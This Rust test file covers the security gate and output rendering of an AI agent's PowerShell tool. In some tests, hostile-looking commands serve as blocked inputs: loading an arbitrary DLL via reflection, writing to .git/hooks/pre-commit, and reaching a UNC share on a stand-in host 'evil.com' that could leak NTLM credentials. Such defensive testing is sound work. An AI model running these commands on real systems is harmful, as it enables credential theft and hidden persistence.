//! Tests for PowerShellTool's R5-T9 security pipeline integration.
//!
//! These tests verify that the execute path actually runs the gate
//! helpers from `powershell.rs` — previously they were dead code.

use super::PowerShellTool;
use coco_tool_runtime::Tool;
use coco_tool_runtime::ToolUseContext;
use serde_json::json;

/// Unsafe CLM type reference must be blocked before pwsh is spawned.
/// TS `powershellCommandIsSafe()` rejects types outside the allowlist.
#[tokio::test]
async fn test_powershell_rejects_unsafe_clm_type() {
    let ctx = ToolUseContext::test_default();
    let result = PowerShellTool
        .execute(
            json!({"command": "[System.Reflection.Assembly]::LoadFrom('x.dll')"}),
            &ctx,
        )
        .await;
    assert!(result.is_err(), "unsafe .NET type must be rejected");
    let err = result.unwrap_err().to_string();
    assert!(
        err.contains("allowlist") || err.contains("security"),
        "error should mention CLM allowlist: {err}"
    );
}

/// Writing to `.git/hooks/...` via a destructive cmdlet must be blocked.
/// TS `hasDotGitInternalPath()` catches this pattern.
#[tokio::test]
async fn test_powershell_rejects_git_internal_write() {
    let ctx = ToolUseContext::test_default();
    let result = PowerShellTool
        .execute(
            json!({"command": "Set-Content .git/hooks/pre-commit 'evil'"}),
            &ctx,
        )
        .await;
    assert!(result.is_err(), "git-internal write must be rejected");
}

/// UNC paths in command arguments must be blocked (NTLM credential leak).
#[tokio::test]
async fn test_powershell_rejects_unc_path() {
    let ctx = ToolUseContext::test_default();
    let result = PowerShellTool
        .execute(
            json!({"command": "Get-ChildItem \\\\evil.com\\share"}),
            &ctx,
        )
        .await;
    assert!(result.is_err(), "UNC path must be rejected");
    let err = result.unwrap_err().to_string();
    assert!(
        err.contains("UNC") || err.contains("credential"),
        "error should mention UNC/credential: {err}"
    );
}

/// Read-only commands (Get-Process, Get-ChildItem, etc.) must be
/// classified as `is_read_only == true` so the executor can batch them
/// with other safe tools. Matches Bash's read-only fast path.
#[test]
fn test_powershell_read_only_fast_path() {
    let cases = [
        "Get-Process",
        "Get-ChildItem",
        "Get-Content x.txt",
        "Select-String -Pattern foo file.txt",
    ];
    for cmd in cases {
        let input = json!({"command": cmd});
        assert!(
            PowerShellTool.is_read_only(&input),
            "`{cmd}` should be read-only"
        );
        assert!(
            PowerShellTool.is_concurrency_safe(&input),
            "`{cmd}` should be concurrency-safe"
        );
        assert!(
            !PowerShellTool.is_destructive(&input),
            "`{cmd}` should not be destructive"
        );
    }
}

/// Destructive cmdlets (Set-Content, Remove-Item, Invoke-WebRequest) must
/// be classified as destructive so they route through the permission
/// prompt upstream.
#[test]
fn test_powershell_destructive_classification() {
    let cases = [
        "Set-Content foo.txt bar",
        "Remove-Item -Recurse -Force foo",
        "New-Item -ItemType File bar",
    ];
    for cmd in cases {
        let input = json!({"command": cmd});
        assert!(
            !PowerShellTool.is_read_only(&input),
            "`{cmd}` should not be read-only"
        );
        assert!(
            PowerShellTool.is_destructive(&input),
            "`{cmd}` should be destructive"
        );
    }
}

/// TS `PowerShellTool.tsx:275` sets `maxResultSizeChars: 30_000`.
#[test]
fn test_powershell_max_result_size_matches_ts() {
    assert_eq!(PowerShellTool.max_result_size_chars(), 30_000);
}

/// Missing `command` fails validation before execute runs.
#[test]
fn test_powershell_missing_command_fails_validation() {
    let ctx = ToolUseContext::test_default();
    let result = PowerShellTool.validate_input(&json!({}), &ctx);
    assert!(matches!(
        result,
        coco_tool_runtime::ValidationResult::Invalid { .. }
    ));
}

/// Timeouts above the 10-minute cap are rejected at validation time.
#[test]
fn test_powershell_timeout_max_enforced() {
    let ctx = ToolUseContext::test_default();
    let result =
        PowerShellTool.validate_input(&json!({"command": "Get-Process", "timeout": 700_000}), &ctx);
    assert!(matches!(
        result,
        coco_tool_runtime::ValidationResult::Invalid { .. }
    ));
}

/// Read-only commands skip the CLM security gate — otherwise a harmless
/// `Get-Content x | Select-Object [*]` could trip the type pattern. The
/// gate only runs for destructive commands.
#[tokio::test]
async fn test_powershell_readonly_bypasses_clm_gate() {
    // `[int]` is allowed, but even if it weren't, the read-only fast path
    // should skip the gate. We choose `[System.Whatever]` (not allowed)
    // inside a Get- command to prove the gate is bypassed.
    let ctx = ToolUseContext::test_default();
    let result = PowerShellTool
        .execute(
            json!({"command": "Get-Content 'file.txt' # [System.Reflection.Assembly]"}),
            &ctx,
        )
        .await;
    // We expect this to either succeed (if pwsh is installed) or fail
    // with a pwsh-spawn error — NOT with a security-gate error.
    if let Err(e) = result {
        let msg = e.to_string();
        assert!(
            !msg.contains("allowlist") && !msg.contains("security"),
            "read-only command must bypass CLM gate, got: {msg}"
        );
    }
}

// ── render_for_model — TS parity for output envelopes ────────────────

mod render_tests {
    use super::PowerShellTool;
    use coco_tool_runtime::Tool;
    use coco_tool_runtime::ToolResultContentPart;
    use serde_json::json;

    fn text_of(parts: &[ToolResultContentPart]) -> &str {
        match &parts[0] {
            ToolResultContentPart::Text { text, .. } => text.as_str(),
            _ => panic!("expected Text part"),
        }
    }

    #[test]
    fn background_status_emits_message_directly() {
        let data = json!({
            "task_id": "ps-1",
            "status": "background",
            "message": "PowerShell command running in background. Task ID: ps-1.",
        });
        let parts = PowerShellTool.render_for_model(&data);
        assert_eq!(
            text_of(&parts),
            "PowerShell command running in background. Task ID: ps-1."
        );
    }

    #[test]
    fn foreground_joins_stdout_and_stderr() {
        let data = json!({
            "stdout": "hello\nworld",
            "stderr": "warn: x",
            "exitCode": 0,
            "interrupted": false,
        });
        let parts = PowerShellTool.render_for_model(&data);
        let text = text_of(&parts);
        assert!(text.contains("hello\nworld"), "got: {text}");
        assert!(text.contains("warn: x"), "got: {text}");
    }

    #[test]
    fn interrupted_appends_abort_marker() {
        // TS `PowerShellTool.tsx:415-418`: interrupted runs append the
        // `<error>Command was aborted before completion</error>` marker
        // even when stderr is empty.
        let data = json!({
            "stdout": "partial",
            "stderr": "",
            "interrupted": true,
        });
        let parts = PowerShellTool.render_for_model(&data);
        let text = text_of(&parts);
        assert!(text.contains("partial"), "got: {text}");
        assert!(
            text.contains("<error>Command was aborted before completion</error>"),
            "got: {text}"
        );
    }

    #[test]
    fn persisted_output_path_is_ignored_by_renderer() {
        // Legacy persisted-output fields are not a model-visible
        // persistence source. The query-level generic Level 1
        // pipeline owns the `<persisted-output>` envelope.
        let data = json!({
            "stdout": "first line\nsecond line",
            "stderr": "",
            "interrupted": false,
            "persistedOutputPath": "/tmp/coco-ps-1.txt",
            "persistedOutputSize": 1_500_000,
        });
        let parts = PowerShellTool.render_for_model(&data);
        let text = text_of(&parts);
        assert!(text.contains("first line\nsecond line"), "got: {text}");
        assert!(!text.contains("<persisted-output>"), "got: {text}");
        assert!(!text.contains("/tmp/coco-ps-1.txt"), "got: {text}");
    }

    #[test]
    fn assistant_auto_backgrounded_emits_budget_message() {
        // TS `PowerShellTool.tsx:422-423`: assistant-mode auto-promotion
        // names the budget so the model knows to delegate next time.
        let data = json!({
            "stdout": "",
            "stderr": "",
            "interrupted": false,
            "backgroundTaskId": "ps-99",
            "assistantAutoBackgrounded": true,
        });
        let parts = PowerShellTool.render_for_model(&data);
        let text = text_of(&parts);
        assert!(
            text.contains("Command exceeded the assistant-mode blocking budget"),
            "got: {text}"
        );
        assert!(text.contains("ps-99"), "got: {text}");
    }

    #[test]
    fn backgrounded_by_user_emits_manual_message() {
        // TS `PowerShellTool.tsx:424-425`: Ctrl+B-style manual move.
        let data = json!({
            "stdout": "",
            "stderr": "",
            "interrupted": false,
            "backgroundTaskId": "ps-7",
            "backgroundedByUser": true,
        });
        let parts = PowerShellTool.render_for_model(&data);
        let text = text_of(&parts);
        assert!(
            text.contains("Command was manually backgrounded by user"),
            "got: {text}"
        );
        assert!(text.contains("ps-7"), "got: {text}");
    }

    #[test]
    fn default_background_task_emits_short_message() {
        // TS `PowerShellTool.tsx:427`: plain `run_in_background:true`
        // path gets the short "running in background" message.
        let data = json!({
            "stdout": "",
            "stderr": "",
            "interrupted": false,
            "backgroundTaskId": "ps-3",
        });
        let parts = PowerShellTool.render_for_model(&data);
        let text = text_of(&parts);
        assert!(
            text.contains("Command running in background with ID: ps-3"),
            "got: {text}"
        );
        assert!(
            !text.contains("assistant-mode"),
            "should not name budget: {text}"
        );
        assert!(!text.contains("manually"), "should not say manual: {text}");
    }
}
